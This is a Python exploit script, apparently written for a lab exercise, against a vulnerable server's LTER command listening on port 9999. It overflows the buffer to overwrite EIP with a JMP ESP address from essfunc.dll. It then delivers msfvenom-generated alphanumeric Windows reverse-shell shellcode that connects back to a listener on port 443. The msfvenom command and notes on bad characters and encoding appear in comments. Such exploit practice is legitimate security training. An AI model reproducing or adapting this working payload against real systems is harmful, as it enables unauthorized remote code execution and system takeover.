#!/usr/bin/python3

import socket

host = "10.0.0.192"
port = 9999

# This command, LTER, has two potential vulnerabilities that I have found. Lower buffer lengths (~3500 and down) overwrite EIP, but ~3750 and up will overwrite SEH.
# SEH overwrite is covered in a separate exploit.

# We are limited to hex characters from \x01 to \x7F; higher values get swapped out for corresponding lower ones (\x80 becomes \x01, etc)

# msfvenom --platform windows -a x86 -p windows/shell_reverse_tcp LHOST=10.0.0.157 LPORT=443 EXITFUNC=thread BufferRegister=ESP -e x86/alpha_mixed -b "\x00" -f python
# Note the additional option of "BufferRegister" included here with the alpha_mixed encoding. This is necessary because the shellcode needs to determine its absolute
# location in memory prior to execution, which requires non-alphanumeric characters. In this case, I know the location of the shellcode is located in ESP for this 
# exploit, so I can tell msfvenom that and it will produce functional yet purely alphanumeric shellcode.

buf =  b""
buf += b"\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
buf += b"\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
buf += b"\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
buf += b"\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
buf += b"\x39\x6c\x49\x78\x6e\x62\x45\x50\x77\x70\x33\x30\x63"
buf += b"\x50\x4f\x79\x6d\x35\x75\x61\x39\x50\x45\x34\x4c\x4b"
buf += b"\x52\x70\x70\x30\x4e\x6b\x73\x62\x36\x6c\x6c\x4b\x50"
buf += b"\x52\x72\x34\x6e\x6b\x32\x52\x37\x58\x64\x4f\x38\x37"
buf += b"\x43\x7a\x71\x36\x36\x51\x49\x6f\x6c\x6c\x55\x6c\x50"
buf += b"\x61\x33\x4c\x55\x52\x44\x6c\x61\x30\x79\x51\x7a\x6f"
buf += b"\x64\x4d\x57\x71\x6a\x67\x48\x62\x7a\x52\x52\x72\x30"
buf += b"\x57\x4e\x6b\x42\x72\x36\x70\x6c\x4b\x63\x7a\x35\x6c"
buf += b"\x4c\x4b\x72\x6c\x52\x31\x54\x38\x5a\x43\x70\x48\x77"
buf += b"\x71\x6a\x71\x72\x71\x6e\x6b\x31\x49\x55\x70\x66\x61"
buf += b"\x59\x43\x6c\x4b\x73\x79\x44\x58\x6a\x43\x64\x7a\x72"
buf += b"\x69\x6c\x4b\x74\x74\x6e\x6b\x76\x61\x59\x46\x44\x71"
buf += b"\x79\x6f\x6c\x6c\x49\x51\x48\x4f\x54\x4d\x55\x51\x48"
buf += b"\x47\x50\x38\x4b\x50\x63\x45\x68\x76\x74\x43\x33\x4d"
buf += b"\x6a\x58\x65\x6b\x63\x4d\x46\x44\x52\x55\x6a\x44\x56"
buf += b"\x38\x4e\x6b\x63\x68\x34\x64\x77\x71\x4e\x33\x65\x36"
buf += b"\x6e\x6b\x36\x6c\x72\x6b\x4e\x6b\x66\x38\x37\x6c\x37"
buf += b"\x71\x58\x53\x6c\x4b\x65\x54\x6c\x4b\x55\x51\x6a\x70"
buf += b"\x4b\x39\x61\x54\x75\x74\x57\x54\x71\x4b\x33\x6b\x50"
buf += b"\x61\x52\x79\x32\x7a\x72\x71\x79\x6f\x4b\x50\x43\x6f"
buf += b"\x33\x6f\x52\x7a\x6e\x6b\x36\x72\x78\x6b\x6e\x6d\x43"
buf += b"\x6d\x75\x38\x64\x73\x57\x42\x67\x70\x43\x30\x72\x48"
buf += b"\x30\x77\x43\x43\x36\x52\x61\x4f\x76\x34\x32\x48\x32"
buf += b"\x6c\x52\x57\x45\x76\x67\x77\x39\x6f\x7a\x75\x48\x38"
buf += b"\x4c\x50\x65\x51\x43\x30\x57\x70\x46\x49\x59\x54\x30"
buf += b"\x54\x42\x70\x45\x38\x65\x79\x6b\x30\x30\x6b\x63\x30"
buf += b"\x79\x6f\x6a\x75\x50\x50\x72\x70\x56\x30\x46\x30\x77"
buf += b"\x30\x72\x70\x63\x70\x62\x70\x52\x48\x7a\x4a\x56\x6f"
buf += b"\x79\x4f\x6d\x30\x49\x6f\x69\x45\x6e\x77\x51\x7a\x74"
buf += b"\x45\x65\x38\x67\x7a\x43\x30\x63\x30\x6d\x4d\x62\x48"
buf += b"\x33\x32\x43\x30\x33\x31\x6d\x6b\x6c\x49\x6b\x56\x42"
buf += b"\x4a\x34\x50\x53\x66\x51\x47\x51\x78\x5a\x39\x39\x35"
buf += b"\x42\x54\x61\x71\x69\x6f\x6a\x75\x6e\x65\x69\x50\x71"
buf += b"\x64\x44\x4c\x59\x6f\x62\x6e\x43\x38\x54\x35\x5a\x4c"
buf += b"\x33\x58\x6c\x30\x4f\x45\x79\x32\x31\x46\x4b\x4f\x5a"
buf += b"\x75\x71\x78\x51\x73\x72\x4d\x71\x74\x33\x30\x4e\x69"
buf += b"\x6b\x53\x71\x47\x76\x37\x51\x47\x45\x61\x39\x66\x32"
buf += b"\x4a\x44\x52\x63\x69\x70\x56\x79\x72\x39\x6d\x30\x66"
buf += b"\x5a\x67\x31\x54\x44\x64\x75\x6c\x73\x31\x53\x31\x4e"
buf += b"\x6d\x71\x54\x75\x74\x54\x50\x7a\x66\x45\x50\x67\x34"
buf += b"\x53\x64\x62\x70\x43\x66\x33\x66\x53\x66\x62\x66\x73"
buf += b"\x66\x30\x4e\x42\x76\x56\x36\x70\x53\x73\x66\x51\x78"
buf += b"\x71\x69\x78\x4c\x77\x4f\x4c\x46\x49\x6f\x6e\x35\x4b"
buf += b"\x39\x4d\x30\x32\x6e\x73\x66\x32\x66\x69\x6f\x64\x70"
buf += b"\x31\x78\x34\x48\x6f\x77\x77\x6d\x73\x50\x79\x6f\x79"
buf += b"\x45\x4f\x4b\x69\x70\x65\x4d\x35\x7a\x66\x6a\x65\x38"
buf += b"\x4d\x76\x5a\x35\x6d\x6d\x4f\x6d\x6b\x4f\x48\x55\x55"
buf += b"\x6c\x74\x46\x43\x4c\x54\x4a\x4b\x30\x6b\x4b\x59\x70"
buf += b"\x50\x75\x73\x35\x4f\x4b\x53\x77\x44\x53\x52\x52\x62"
buf += b"\x4f\x50\x6a\x47\x70\x76\x33\x39\x6f\x59\x45\x41\x41"

buffer = b"\x41" * 2002
buffer += b"\x03\x12\x50\x62" # JMP ESP in essfunc.dll that accounts for bad characters
buffer += buf
buffer += b"\x43" * (3500 - len(buffer)) # NOP instruction is a bad character so I just use Cs here.

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = s.connect((host,port))
banner = s.recv(1024)
print(banner.decode())

# Crafting and sending exploit packet

exploit = "LTER /.:/ ".encode() + bytearray(buffer) + "\r\n".encode()

s.send(exploit)
response = s.recv(1024)
print(response.decode())
s.close()
